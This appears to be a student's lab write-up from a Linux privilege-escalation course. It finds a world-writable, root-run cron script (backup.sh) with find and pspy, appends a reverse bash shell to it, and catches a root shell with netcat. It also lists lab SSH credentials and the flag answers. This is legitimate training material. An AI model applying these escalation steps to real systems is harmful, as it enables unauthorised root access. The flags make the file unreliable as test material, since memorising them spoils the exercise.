
- The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. 
- Cron created files found in `/var/spool/cron` 
- Each entry in the crontab file requires six items in the following order: 
	- minutes
	- hours
	- days
	- months
	- weeks
	- commands
- Some apps create cron job files in /etc/cron.d

Cron job files often have mis-configurations that allow non-root users to modify a file because they don't have the proper permissions set.

Use a find command to search for world writable files and directories:
```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Use the [pspy](https://github.com/DominicBreuker/pspy) tool to view running processes without root permissions. It can be used to see commands run by users, cron jobs, processes etc.,

### pspy example
```shell-session
./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

 - `pspy` discovers a cron job creating a backup.sh file every three minutes. 
 - If we can edit this file then add a reverse shell bash one line. When it executes at the three minute mark we will have a shell!

### Questions

1. Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.

#### IP
```
10.129.66.201
```

#### Username
```
htb-student
```

#### Password
```
Academy_LLPE!
```

#### SSH
```
ssh htb-student@10.129.66.201
```


 #### Finding the backup.sh file
 ```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/sys/fs/cgroup/memory/user.slice/cgroup.event_control
```

SCP'd the pspy32s file to victim
```
scp ~/Downloads/pspy32s htb-student@10.129.66.201:/tmp
```

Running pspy we see the backup.sh file. After a few more minutes we see it's being stored in the /dmz-backups/ directory and tar'ring a file to `/var/www/html`

```
htb-student@NIX02:/tmp$ ./pspy32s -pf -i 1000
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/03/02 13:58:57 CMD: UID=1008  PID=2611   | ./pspy32s -pf -i 1000 
2024/03/02 13:58:57 CMD: UID=0     PID=2608   | 
2024/03/02 13:58:57 CMD: UID=0     PID=2540   | 
2024/03/02 13:58:57 CMD: UID=0     PID=2431   | 
2024/03/02 13:58:57 CMD: UID=0     PID=2397   | 
2024/03/02 13:58:57 CMD: UID=0     PID=2361   | 
2024/03/02 13:58:57 CMD: UID=1008  PID=2282   | -bash 
2024/03/02 13:58:57 CMD: UID=1008  PID=2279   | sshd: htb-student@pts/0
2024/03/02 13:58:57 CMD: UID=1008  PID=2187   | (sd-pam) 

```

![[Pasted image 20240302081742.png]]

Edit backup.sh to add a reverse bash one liner at the bottom
![[Pasted image 20240302083006.png]]


FLAG.TXT

Initially I used a find command to find the flag.txt file. But it also found the other flags for other lessons. I then just went to the root directory for this lesson to find the correct flag.
```
─$ netcat -nlvp 8080
listening on [any] 8080 ...
connect to [10.10.16.45] from (UNKNOWN) [10.129.66.201] 41156
bash: cannot set terminal process group (2826): Inappropriate ioctl for device
bash: no job control in this shell
root@NIX02:~#      

root@NIX02:~# find / -type f -name flag.txt -exec cat {} \; 2>/dev/null
find / -type f -name flag.txt -exec cat {} \; 2>/dev/null
91927dad55ffd22825660da88f2f92e0
46237b8aa523bc7e0365de09c0c0164f
14347a2c977eb84508d3d50691a7ac4b
6a9c151a599135618b8f09adc78ab5f1
root@NIX02:~# cd /root
cd /root
root@NIX02:~# ls -l
ls -l
total 16
drwxr-xr-x 2 root root 4096 Jan 25 11:28 cron_abuse
drwxrwxr-x 2 root root 4096 Jan 25 11:28 kernel_exploit
drwxr-xr-x 2 root root 4096 Jan 25 11:28 ld_preload
drwx------ 2 root root 4096 Jan 25 11:28 screen_exploit
root@NIX02:~# cd cron_abuse
cd cron_abuse
root@NIX02:~/cron_abuse# ls
ls
flag.txt
root@NIX02:~/cron_abuse# cat flag.txt   
cat flag.txt
14347a2c977eb84508d3d50691a7ac4b
root@NIX02:~/cron_abuse# 

```